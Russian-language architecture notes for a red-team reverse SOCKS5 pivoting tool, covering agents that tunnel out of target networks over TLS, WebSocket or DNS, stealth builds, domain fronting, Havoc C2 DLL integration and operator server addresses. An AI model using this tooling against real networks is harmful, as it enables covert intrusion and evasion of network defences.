# revsocks — Архитектура

Reverse SOCKS5 proxy для red-team lateral movement / pivoting. В отличие от ligolo (TUN, L3), revsocks — **socks5** (L5, application proxy): agent на цели → server, operator подключается к server как socks5-клиент, traffic релеится через agent в сеть цели. Go, fork `JohnDow22/revsocks` (upstream `kost/revsocks`).

## Схема

```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│  Operator   │  socks5 │   Server     │ yamux   │   Agent     │
│ (curl/-x)   │ ───────>│ (multiplexer)│ ───────>│ (socks5 srv)│ ──> target network
│  :1080      │         │  :443 (TLS/WS)│         │  на цели    │
└─────────────┘         └──────────────┘         └─────────────┘
                              │ admin API
                              ▼  :8081 (console: agents list/sleep/wake)
```

Traffic: `curl -x socks5://127.0.0.1:1080 https://target` → server → agent → target network (DNS/HTTP/etc).

## Компоненты

### Agent (`cmd/agent/main.go`, `internal/agent/`)
- Запускается на цели. Коннектится **outbound** к server (TCP+TLS или WebSocket+WSS или DNS-tunnel).
- `client.go` (29KB) — core: handshake v3, yamux session, socks5 server (через `armon/go-socks5`).
- Режимы: **TUNNEL** (persistent connection), **SLEEP/beacon** (periodic check-ins, interval+jitter — стелс).
- `baked.go` — конфиг вшит (stealth build, без CLI флагов).
- AgentID персистентен (`~/.revsocks.id`).

### Server (`cmd/server/main.go`, `internal/server/`)
- Слушает agent-коннекты (`-listen :443`) + operator socks5 (`-socks :1080`).
- `server.go` — HTTP/WebSocket listener, agent handler. `session.go` — yamux session lifecycle. `agent_manager.go` — state (TUNNEL/SLEEP, agents.json DB). `api.go` — admin HTTP API (`-admin-port :8081`).
- Мультиплексирует operator↔agent через yamux.

### Transport (`internal/transport/`)
- `yamux.go` — HashiCorp yamux (multiplexing, **default keepalive 30s, write timeout 300s** — было 10s, рвало tunnel под нагрузкой как у ligolo; задача 002). Флаги `-yamux-keepalive`, `-yamux-timeout` для override. Handshake v3 (`ValidateClientSettings`) ВАЛИДИРУЕТ совпадение agent↔server — дефолты синхронизированы (300s на обоих).
- `tls.go` — TLS cert gen + cache (`~/.revsocks-tls-cache/`).

### Protocol v3 (`internal/common/protocol.go`)
Text-based handshake:
```
Agent → Server: "AUTH <password> <agent_id> <version>"
Server → Agent: "CMD TUNNEL" | "CMD SLEEP <interval> <jitter>" | "ERR <msg>"
```
Length-prefixed AgentID (max 255). Обратно-совместим с v2.

### DNS tunnel (`internal/dns/dns.go`)
Alternative covert transport (медленный, low bandwidth). Agent: `-dns <domain> -pass <key>`. Server: `-dnslisten :53 -dns <domain>`. На `kost/dnstun`.

### Console (`tools/console/`, Python)
CLI для operator: `agents list`, `agent sleep/wake/rename`, `session kill`. HTTP к admin API (:8081, без auth). cmd2 + rich. pytest E2E.

## Транспортные режимы
1. **TCP + TLS** (default) — mTLS, cert cache, быстрый.
2. **WebSocket + WSS** (`-ws`) — выглядит как HTTPS, domain fronting, обход DPI.
3. **DNS tunnel** (`-dns`) — covert, high latency.

## Build (`Makefile`, `build.sh`)
- `make agent` / `make server` — обычные бинари.
- `make agent-dll` — **c-shared DLL для Havoc DllSpawn** (args из lpvReserved, как ligolo-ng; задача 001). `CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags "-s -w" -o dist/revsocks-agent.dll ./cmd/agent` → 8.0M, exports `DllMain`. DLL кладётся в `HavoX/client/commander/modules/soks/bin/revsocks-agent.dll`.
- `make stealth` / `./build.sh stealth` — agent со **вшитым конфигом** (`config/revsocks.yaml` → `internal/agent/baked.go` через `tools/confgen`), без CLI флагов, UPX optional.

## Agent DLL adapter (HavoX DllSpawn, задача 001)
Паттерн ligolo-ng `havoc_dll.go` 1:1:
- `cmd/agent/main.go` — `main()` → `mainImpl()` (единая точка входа для EXE и DLL).
- `cmd/agent/havoc_dll.go` (`//go:build cgo && windows`) — `//export DllMain`: `lpvReserved` → `C.GoString` → base64 decode → `strings.Fields` → `os.Args = ["revsocks", ...]` → `mainImpl()` синхронно. atomic CAS guard от двойного старта. Нет `-connect` → return (no baked fallback для DLL build, isStealth=false).
- `cmd/agent/main_exe.go` (`//go:build !cgo`) — `func main(){ mainImpl() }` (EXE entry).
- soks.py (`HavoX`) уже кодирует base64 args через `DllSpawn` — НЕ трогать. Прежняя kost v2.8 DLL игнорила lpvReserved (target хардкод) — заменена на нашу v3.
- `make static` — static cross-platform.
- `./build.sh {normal|stealth|server|clean}`.

## Config (`config/revsocks.yaml`)
```yaml
agent:
  password: "..."
  servers:
    - address: "wss://host:443"
      name: "main"
  failover: { retry_count: 3, retry_interval: 300, full_cycle_pause: 3600 }
  tls_enabled: true
  use_websocket: true
  verify: false
  quiet_mode: true
  yamux: { enable_keepalive: true, keepalive_interval: 30, write_timeout: 60 }
```

## Использование
**Operator:**
```bash
make server
./revsocks-server -listen :443 -socks :1080 -pass SECRET -tls -ws -admin-api -admin-port :8081
cd tools/console && python3 main.py   # agents list / agent sleep <id> 60
curl -x socks5://127.0.0.1:1080 https://target   # traffic → agent → target
```
**Agent (на цели):** `./revsocks-agent -connect server:443 -pass SECRET -tls -ws` (или stealth без флагов).

## Зависимости
`hashicorp/yamux` (mux), `armon/go-socks5` (socks5), `nhooyr.io/websocket` (WS), `kost/dnstun` (DNS), `golang.org/x/crypto` (TLS).

## Связь с другими проектами
- **ligolo-ng** (`~/Desktop/Prj/ligolo-ng-new`) — тоже reverse tunnel, но **TUN/L3** (full network pivot), revsocks — **socks5/L5** (app proxy). Дополняют: ligolo для full pivot, revsocks для лёгкого socks (agent меньше, проще).
- **deploy repo** (`~/Desktop/Prj/deploy`) — пока НЕ включает revsocks (надо добавить модуль `lib/revsocks.sh`?).
- yamux — общий с ligolo. **Возможна та же проблема** ConnectionWriteTimeout=10s (по умолчанию в `internal/transport/yamux.go`) — стоит проверить при стрессе (как ligolo задача 001).

## Тесты
- `tests/e2e/` — black-box (реальные бинари): Basic, Reconnect, MultipleClients, CurlRealProxy, WebSocket (TLS, Sleep/Wake, v3).
- `tools/console/tests/` — pytest E2E (admin API).

## Источники правды
- Репа: `~/Desktop/Prj/revsocks` (origin `JohnDow22/revsocks`).
- Config: `config/revsocks.yaml` (+ `revsocks_dev.yaml`).
- Docs: `docs/` (CHANGELOG, Features, Bugfixes).
- Build: `Makefile`, `build.sh`, `tools/confgen` (baked.go generator).

## HavoX UI интеграция (как ligolo) — задача 004
revsocks в HavoX UI: оператор вбивает host:port socks-сервера (+pass/tls/ws) в панели → TS_Config → команда `revsocks_start` (без args) берёт конфиг из DB. revsocks **без CF** (прямой TCP+TLS+WS).
- **HavoX** (commit `7c22499`): `client/app/src/components/RevsocksPanel.jsx` (modal) + AppHeader кнопка. `sse_router.py` `/revsocks/config` GET/POST. `modules/soks/soks.py`: `revsocks_start` (DB config) + `revsocks_info`; `socks` — manual alias.
- **DB миграция idempotent** (deploy `2bc7878`): `lib/havox.sh setup_havox` → `INSERT OR IGNORE INTO TS_Config` (ligolo_direct_hostport/wss + revsocks_hostport/password/tls/ws). defaults из config.env. key есть от UI-save → не трогается.
- **recon**: `lib/revsocks.sh` (deploy product, work:2 revsocks link), `REVSOCKS_HOSTPORT=185.224.132.148:443`, `REVSOCKS_PASS=3870acd6...`.
- **OPS server на 162.252.199.92** (deploy `1b0c7ed`): `ops/modules/revsocks_direct.sh` (build локально make server + scp на 162 + tmux `revsocks`). `ops/deploy.sh ops revsocks_direct`. `REVSOCKS_HOSTPORT=162.252.199.92:443` (OPS per-env pass).
- **Тест PASS** (демон e55ce801): `revsocks_start` → DB config → CMD TUNNEL → agent online. SOCKS5: `curl -x socks5://127.0.0.1:1080 http://...` → traffic через agent, 0 yamux drop.

**Грабли:** WS режим требует `wss://` схему (soks.py добавляет auto); `:1080` socks listener lazy (после agent connect); recon демоны часто stale — свежий через P53 `cmd demon_debug`.

